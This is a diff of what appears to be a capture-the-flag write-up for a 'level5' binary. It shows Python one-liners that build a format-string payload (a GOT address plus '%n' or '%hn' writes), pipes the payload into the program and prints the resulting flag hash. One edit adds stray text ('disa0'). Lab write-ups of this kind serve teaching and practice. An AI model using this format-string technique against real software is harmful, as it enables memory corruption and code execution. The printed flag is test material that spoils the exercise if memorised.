@@ -32,11 +32,11 @@ All defined functions:
 0x080484a4 (hex) = 134513828
 33956 (hex) = 33956
 
-- We will use 'hn' for 33956 or 'h' for 134513828, Now we need to make the payload for exploiting.
+- We will use 'hn' for 33956 or 'n' for 134513828, Now we need to make the payload for exploiting.
 
-$> python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4\$n'" > /tmp/payload
+$> python -c "print '\x38\x98\x04\x08' + '%134513824d' + '%4$n'" > /tmp/payload
 or
-$> python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/payload
+$> python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4$hn'" > /tmp/payload
 $> cat /tmp/payload - | ./level5
-[...]
+[...]disa0
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
